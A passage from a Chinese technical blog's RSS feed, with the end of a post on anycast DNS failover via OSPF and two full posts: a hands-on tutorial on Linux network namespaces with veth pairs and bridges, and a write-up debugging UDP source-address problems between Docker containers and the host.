&lt;p&gt;通过配置4个 DNS 节点服务器的 Loopback 地址为相同 IP，例如1.1.1.1/32。然后服务器直接与CE路由器建立 OSPF 邻居，对外宣告1.1.1.0/27网段，这样PE就会学习到1.1.1.0/27。&lt;/p&gt;

&lt;p&gt;（注：为什么要宣告/27，而不是/32？那是因为上面有规定，为了减小VPN路由表，PE设备规定了只接受大于/8，小于等于/27的网段宣告进入骨干网。Internet 里也有类似规定）&lt;/p&gt;

&lt;p&gt;以上步骤完成后，骨干网里对1.1.1.1/27会有4个不同的出口路由器，客户端使用1.1.1.1作为DNS服务器，根据 OSPF 选择到最优路径。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;万一出故障怎么办：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;如果 DNS 服务器中某几台出现故障，例如重庆的2台 DNS 服务器宕机，OSPF 协议会立即停止宣告此1.1.1.0/27的网段，路由表中只有异地的 DNS 可供选择，但是客户端是不会感知到，从而达到业务的平滑迁移和服务的高可用性，完全不需要人工干预。&lt;/p&gt;

&lt;p&gt;半夜12点，老王正在酣睡。突然一阵清脆的手机铃声响起，把老王从睡梦中拉回现实。&lt;/p&gt;

&lt;p&gt;“喂，谁啊？”&lt;/p&gt;

&lt;p&gt;“王工，我是监控中心的，公司的XXX服务器挂了，你赶紧看一下吧。”&lt;/p&gt;

&lt;p&gt;“不要慌，能自动切换的，该睡觉睡觉，该休息休息，明天上班再来处理！”&lt;/p&gt;

</description>
        <pubDate>Tue, 10 Sep 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019-09-10/AnyCast%E5%AE%9E%E7%8E%B0DNS%E9%AB%98%E5%8F%AF%E7%94%A8/</link>
        <guid isPermaLink="true">http://localhost:4000/2019-09-10/AnyCast%E5%AE%9E%E7%8E%B0DNS%E9%AB%98%E5%8F%AF%E7%94%A8/</guid>
        
        <category>DNS</category>
        
        
        <category>网络</category>
        
      </item>
    
      <item>
        <title>Linux namespace</title>
        <description>&lt;p&gt;之前做过一段时间 docker 相关的工作，只能算熟悉相关命令，很多原理都似是而非。面试的时候被问过一个简单的问题：容器间资源的隔离是怎么实现的？当时只知道是靠 namespace ，但是具体实现不清楚。&lt;/p&gt;

&lt;p&gt;最近深入看了下 Linux namespace ，通过 network namespace 实验了 docker 的 bridge 网络。&lt;/p&gt;

&lt;p&gt;在每个容器中，我们都可以看到文件系统，网卡等资源，这些资源看上去是容器自己的。拿网卡来说，每个容器都会认为自己有一块独立的网卡，即使 host 上只有一块物理网卡。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;namespace 就是 Linux 内核用来隔离内核资源的方式。&lt;/strong&gt;通过 namespace 可以让一些进程只能看到与自己相关的一部分资源，而另外一些进程也只能看到与它们自己相关的资源，这两拨进程根本就感觉不到对方的存在。具体的实现方式是把一个或多个进程的相关资源指定在同一个 namespace 中。&lt;/p&gt;

&lt;p&gt;Linux namespaces 是对全局系统资源的一种封装隔离，使得处于不同 namespace 的进程拥有独立的全局系统资源，改变一个 namespace 中的系统资源只会影响当前 namespace 里的进程，对其他 namespace 中的进程没有影响。&lt;/p&gt;

&lt;p&gt;我们可以从 docker 实现者的角度考虑该如何实现一个资源隔离的容器。比如是不是可以通过 chroot 命令切换根目录的挂载点，从而隔离文件系统。为了在分布式的环境下进行通信和定位，容器必须要有独立的 IP、端口和路由等，这就需要对网络进行隔离。同时容器还需要一个独立的主机名以便在网络中标识自己。接下来还需要进程间的通信、用户权限等的隔离。最后，运行在容器中的应用需要有进程号(PID)，自然也需要与宿主机中的 PID 进行隔离。也就是说这六种隔离能力是实现一个容器的基础，让我们看看 linux 内核的 namespace 特性为我们提供了什么样的隔离能力：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63321909-b0a84e00-c354-11e9-8179-ee7aca298e6e.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里我们就深入了解下network namespace：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Network namespace 在逻辑上是网络堆栈的一个副本，它有自己的路由、防火墙规则和网络设备。&lt;/strong&gt; 默认情况下，子进程继承其父进程的 network namespace。也就是说，如果不显式创建新的 network namespace，所有进程都从 init 进程继承相同的默认 network namespace。&lt;/p&gt;

&lt;p&gt;每个新创建的 network namespace 默认有一个本地环回接口 lo，除此之外，所有的其他网络设备(物理/虚拟网络接口，网桥等)只能属于一个 network namespace。每个 socket 也只能属于一个 network namespace。&lt;/p&gt;

&lt;h3 id=&quot;ip-netns-命令&quot;&gt;ip netns 命令&lt;/h3&gt;
&lt;p&gt;ip netns 命令用来管理 network namespace。本文将使用 ip netns 命令来创建和操作 network namespace。(最近发现&lt;code class=&quot;highlighter-rouge&quot;&gt;ip&lt;/code&gt;比&lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt;好用多了)&lt;/p&gt;

&lt;h3 id=&quot;创建-network-namespace&quot;&gt;创建 network namespace&lt;/h3&gt;

&lt;p&gt;先查看一下默认的 network namespace 的 ID：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63323053-683e5f80-c357-11e9-9f1d-d382e7f39ea7.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后通过 ip netns add 命令创建名为 mynet 的 network namespace：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63323179-ba7f8080-c357-11e9-8642-60d728246a39.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;从上图可以看出，在名为 mynet 的 network namespace 创建成功后，/var/run/netns 目录下多了一个名为 mynet 文件。ip netns exec 子命令可以在对应的 network namespace 中执行命令，下面我们就通过它在 mynet network namespace 中创建一个 bash 进程，并查看 network namespace 的 ID：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63324843-7f7f4c00-c35b-11e9-9e91-91fd2fa52841.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这是一个完全不同的 network namespace ID，而且默认shell也变了，说明当前的 bash 进程运行在一个隔离的 network 环境中。接下来让我们看看新的 network namespace 中都有什么：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63324922-ac336380-c35b-11e9-9767-308b536ef4ec.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;每个新创建的 network namespace 默认有一个本地环回接口 lo，并且这个接口是处于关闭状态的。下面我们就启动这个接口：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63324996-d6852100-c35b-11e9-981f-d95726142cec.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;启动 lo 接口后我们可以看到其 IP 地址，并且能够 ping 通。&lt;/p&gt;

&lt;h3 id=&quot;在两个-network-namespace-之间通信&quot;&gt;在两个 network namespace 之间通信&lt;/h3&gt;

&lt;p&gt;network namespace 之间是相互隔离的，我们可以使用 veth 设备把两个 network namespace 连接起来进行通信。veth 设备是虚拟的以太网设备。它们可以充当 network namespace 之间的通道，也可以作为独立的网络设备使用。&lt;strong&gt;veth 设备总是被成对的创建，并且这一对设备总是连接在一起的，所以一般称之为 veth pair。&lt;/strong&gt;需要注意的是，veth pair 无法单独存在，删除其中一个，另一个也会自动消失。接下来的示例我们就演示如何使用 veth pair 在两个 network namespace 直接通信。示例中我们使用 ip link 命令来创建和管理 veth pair。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;第一步，先创建两个 network namespace net0 和 net1&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip netns add net0
ip netns add net1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;第二步，创建一对命名的 veth 设备&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;默认情况下会自动为 veth pair 生成名称，这里为了易于辨识，我们在创建时指定 veth pair 的名称：&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add vethmother &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;veth peer name vethfather
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63325674-34fecf00-c35d-11e9-8a1e-09443031db75.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如图所示，veth pair 在主机上表现为两个网卡。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;第三步，把这一对 veth pair 分别放到 network namespace net0 和 net1中&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;vethmother netns net0
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;vethfather netns net1
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip addr
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net1 ip addr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63325799-71322f80-c35d-11e9-9403-4b6ab5d95c77.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;查看 net0 和 net1 中的网络资源，发现各自多了一个网卡，也就是 veth 设备的两个端点。注意，当我们把 veth pair 分配到 network namespace 中后，在主机上就看不到它们了。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;第四步，给这些 veth pair 分配 IP 并启用它们&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;vethmother up
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip addr add 10.0.1.1/24 dev vethmother
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip route
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net1 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;vethfather up
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net1 ip addr add 10.0.1.2/24 dev vethfather
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net1 ip route
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;下面通过 ping 命令来验证两个 network namespace 是否可以通信：&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 3 10.0.1.2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63326000-e998f080-c35d-11e9-816b-03b39bff47b2.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;至此，我们构建了一个如下结构的虚拟网络：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63326036-f9b0d000-c35d-11e9-9b76-2670ab5c18f2.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;通过-bridge-连接-network-namespace&quot;&gt;通过 bridge 连接 network namespace&lt;/h3&gt;

&lt;p&gt;虽然 veth pair 可以实现两个 network namespace 之间的通信，但是当需要在多个 network namespace 之间通信的时候，光靠 veth pair 就不行了。我们可以使用 Linux 提供的虚拟交换机，来完成这样的功能。下面的示例演示如何通过虚拟交换机(这里就是一个虚拟网桥)连接多个 network namespace。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;第一步，先添加一个叫 mybridge0 的网桥&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add mybridge0 &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;bridge
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev mybridge0 up
ip addr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对主机来说其实就是新添加了一个网络接口。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;第二步，创建 network namespace 和 veth 设备&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip netns add net0
ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add veth0 &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;veth peer name veth0p 

ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev veth0p netns net0
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev veth0p name eth0
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip addr add 10.0.1.1/24 dev eth0
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev eth0 up
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip addr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63326429-cfabdd80-c35e-11e9-90a8-a41327b7c57a.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上图显示 network namespace net0 中的 eth0 网卡已经启动了。下面把 veth 设备的另一端连接到网桥 mybridge0 上：&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev veth0 master mybridge0
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev veth0 up
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;第三步，重复第二步创建 net1 和 net2，并连接到网桥&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;给 mybridge0 设置 IP：&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev mybridge0 down
ip addr add 10.0.1.254/24 dev mybridge0
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev mybridge0 up
ip addr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过 bridge link 命令查看网桥的信息如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63326917-c8390400-c35f-11e9-8b5c-3700bab628b5.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这时就可以在不同的 network namespace 之间通信了：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63329053-d38e2e80-c363-11e9-9ef5-02199d26cd5a.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们创建的网络拓扑结构如下所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63327204-57461c00-c360-11e9-8340-7d948ff3d0d8.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;总结&quot;&gt;总结&lt;/h3&gt;

&lt;p&gt;通过 network namespace 可以创建相互独立的网络栈，从而实现网络的隔离。其中 network namespace 之间通过 bridge 通信的方式已经与 docker 网络的 bridge 模式非常类似了，剩下的不过就是开启ip.forward，添加NAT规则等等。&lt;/p&gt;
</description>
        <pubDate>Tue, 20 Aug 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019-08-20/Linux-namespace/</link>
        <guid isPermaLink="true">http://localhost:4000/2019-08-20/Linux-namespace/</guid>
        
        <category>容器</category>
        
        
        <category>Linux</category>
        
      </item>
    
      <item>
        <title>深入理解UDP</title>
        <description>&lt;p&gt;最近在工作中遇到一个 docker 容器下 UDP 协议网络不通的问题，困扰了很久，也比较有意思，某一天等红绿灯的时候突然茅塞顿开，所以再此记录一下。&lt;/p&gt;

&lt;p&gt;我们有个应用是 UDP 协议的，部署上去发现无法工作，但是换成 TCP 协议是可以的（应用同时支持 UDP、TCP 协议，切换成 TCP 模式发现一切正常）。虽然换成 TCP 能解决问题，但是我们还是想知道到底 UDP 协议为什么会出现这个问题，以防止后面其他 UDP 应用会有异常。&lt;/p&gt;

&lt;p&gt;这个问题抽象出来是这样的：如果有 UDP 服务运行在主机上，并且监听在 0.0.0.0 地址（也就是所有的 ip 地址），从运行在 docker bridge 网络的容器运行客户端访问服务，两者通信有问题。&lt;/p&gt;

&lt;p&gt;注意以上的的限制条件，通过测试，我们发现下来几种情况都是正常的：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;使用 TCP 协议没有这个问题，这个已经说过了&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;如果 UDP 服务器监听在 eth0 IP 地址上也不会出现这个问题&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;并不是所有的应用都有这个问题，我们的 DNS（dnsmasq + kubeDNS） 也是同样的部署方式，但是功能都正常&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个问题在 docker 上也有 issue 记录：&lt;a href=&quot;https://github.com/moby/moby/issues/15127&quot;&gt;https://github.com/moby/moby/issues/15127&lt;/a&gt; ，但是目前并没有很好的解决方案。&lt;/p&gt;

&lt;p&gt;这篇文章就分析一下出现这个问题的原因。&lt;/p&gt;

&lt;h2 id=&quot;问题重现&quot;&gt;问题重现&lt;/h2&gt;

&lt;p&gt;这个问题很容易重现，我的实验是在 red hat7.5 下用 &lt;code class=&quot;highlighter-rouge&quot;&gt;netcat&lt;/code&gt; 命令完成的，其他系统应该类似。在主机上通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; 监听 5678 端口，然后在容器里使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; 发数据。第一个报文是能发送出去的，但是以后的报文虽然在网络上能看到，但是对方无法接收。&lt;/p&gt;

&lt;p&gt;在主机上运行 nc UDP 服务器&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;# nc -ul 5678&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;然后随便启动一个容器，运行客户端&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/ # nc -u 192.168.106.242 5678&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;nc 的通信是双方的，不管对方输入什么字符，回车后对方就能立即收到。但是在这个模式下，客户端第一次输入对方能够收到，后续的报文对方都收不到。&lt;/p&gt;

&lt;p&gt;在这个实验中，容器使用的是 docker 的默认网络，容器的 ip 是 172.17.0.2，通过 veth pair（图中没有显示）连接到虚拟网桥 docker0（ip 地址为 172.17.0.1），主机本身的网络为 eth0，其 ip 地址为 192.168.106.242&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 172.17.0.2
+----------+
 |   eth0   |
+----+-----+
     |
     |
     |
     |
+----+-----+          +----------+
 | docker0  |           |  eth0    |
+----------+          +----------+
172.17.0.1            192.168.106.242
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;tcpdump-抓包&quot;&gt;tcpdump 抓包&lt;/h2&gt;

&lt;p&gt;遇到这种疑难杂症，第一个想到的抓包，我们需要在 docker0 上抓包，因为这是报文必经过的地方。通过过滤容器的 ip 地址，很容易找到感兴趣的报文：&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;# tcpdump -i docker0 -n host 172.17.0.2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;为了模拟多数应用一问一答的通信方式，我们一共发送三个报文，并用 tcpdump 抓取 docker0 接口上的报文：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;客户端先向服务器端发送 hello&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;服务器端回复 world&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;客户端继续发送 hi 消息&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;抓包的结果如下，可以发现第一个报文发送出去没有任何问题（因为 UDP 是没有 ACK 报文的，所以客户端无法知道对方有没有收到，这里说的没有问题是指没有对应的 ICMP 报文），但是第二个报文从服务端发送的报文，对方会返回一个 ICMP 告诉端口 44182 不可达；第三个报文从客户端发送的报文也是如此。以后的报文情况类似，双方再也无法进行通信了。&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump: verbose output suppressed, use &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; or &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;full protocol decode
listening on docker0, link-type EN10MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, capture size 262144 bytes
14:48:42.514345 IP 172.17.0.2.44182 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.106.242.rrac: UDP, length 6
14:48:47.523098 ARP, Request who-has 172.17.0.1 tell 172.17.0.2, length 28
14:48:47.523144 ARP, Reply 172.17.0.1 is-at 02:42:0c:b4:3f:ee, length 28
14:48:52.325946 IP 172.17.0.1.rrac &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 172.17.0.2.44182: UDP, length 6
14:48:52.325994 IP 172.17.0.2 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 172.17.0.1: ICMP 172.17.0.2 udp port 44182 unreachable, length 42
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;问题原因&quot;&gt;问题原因&lt;/h2&gt;

&lt;p&gt;从网络报文的分析中可以看到服务端返回的报文源地址不是我们预想的 eth0 地址，而是 docker0 的地址，而客户端直接认为该报文是非法的，返回了 ICMP 的报文给对方。&lt;/p&gt;

&lt;p&gt;那么问题的原因也可以分为两个部分：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;为什么应答报文源地址是错误的？&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;既然 UDP 是无状态的，内核怎么判断源地址不正确呢？&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;主机多网络接口-udp-源地址选择问题&quot;&gt;主机多网络接口 UDP 源地址选择问题&lt;/h2&gt;

&lt;p&gt;第一个问题的关键词是：UDP 和多网络接口。因为如果主机上只有一个网络接口，发出去的报文源地址一定不会有错；而我们也测试过 TCP 协议是能够处理这个问题的。&lt;/p&gt;

&lt;p&gt;通过搜索，发现这确实是个已知的问题。在 «TCP/IP详解» 这本书中，已经描述过这个问题，下面是对应的内容：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;这个问题可以归结为一句话：UDP 在多网卡的情况下，可能会发生服务器端源地址不对的情况，这是内核选路的结果。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;为什么 UDP 和 TCP 有不同的选路逻辑呢？因为 UDP 是无状态的协议，内核不会保存连接双方的信息，因此每次发送的报文都认为是独立的，socket 层每次发送报文默认情况不会指明要使用的源地址，只是说明对方地址。因此，内核会为要发出去的报文选择一个 ip，这通常都是报文路由要经过的设备 ip 地址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;del&gt;既然这样，聪明的你可能要问为什么 dnsmasq 服务没有这个问题呢？这个就涉及到 socket 系统调用问题了，我也不会&lt;/del&gt;&lt;/p&gt;

&lt;h2 id=&quot;关于-udp-连接的疑惑&quot;&gt;关于 UDP 连接的疑惑&lt;/h2&gt;

&lt;p&gt;第二个问题是：为什么内核会把源地址和之前不同的报文丢弃？认为它是非法的？因为我们前面已经说过，UDP 协议是无连接的，默认情况下 socket 也不会保存双方连接的信息。即使服务端发送报文的源地址有误，只要对方能正常接收并处理，也不会导致网络不通。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;那是因为 conntrack，内核的 netfilter 模块会保存连接的状态(也就是俗称的 iptables )，并作为防火墙设置的依据。其实和状态防火墙一个道理，它保存的 UDP 连接，只是简单记录了主机上本地 ip 和端口，和对端 ip 和端口，并不会保存更多的内容。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;解决方案&quot;&gt;解决方案&lt;/h2&gt;

&lt;p&gt;知道了问题的原因，解决方案也就很容易找到。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;使用 TCP 协议：如果服务端和客户端使用 TCP 协议进行通信，它们之间的网络是正常的。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;监听在特定网卡：&lt;code class=&quot;highlighter-rouge&quot;&gt;# nc -ul 192.168.106.242 5678&lt;/code&gt;
这种情况下，服务端和客户端也能正常通信。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;del&gt;改动应用程序实现&lt;/del&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019-07-17/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3UDP/</link>
        <guid isPermaLink="true">http://localhost:4000/2019-07-17/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3UDP/</guid>
        
        <category>容器</category>
        
        
        <category>网络</category>
        
      </item>
    
  </channel>
</rss>
